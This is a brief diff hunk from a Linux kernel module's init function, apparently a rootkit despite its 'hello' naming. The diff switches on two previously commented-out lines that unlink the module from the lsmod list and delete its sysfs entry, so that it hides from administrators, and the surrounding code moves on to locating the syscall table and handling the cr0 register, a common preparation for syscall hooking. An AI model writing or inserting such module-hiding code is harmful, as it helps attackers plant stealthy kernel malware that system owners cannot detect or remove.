@@ -437,9 +437,9 @@ static int hello_init(void)
 	unsigned long long cr0;
 
 	/**** hide from lsmod ****/
-	//list_del_init(&THIS_MODULE->list);
+	list_del_init(&THIS_MODULE->list);
 	/**** hide from sysfs ****/
-	//kobject_del(&THIS_MODULE->mkobj.kobj);
+	kobject_del(&THIS_MODULE->mkobj.kobj);
 
 	/**** find syscall table ****/
 	char *kern_ver;
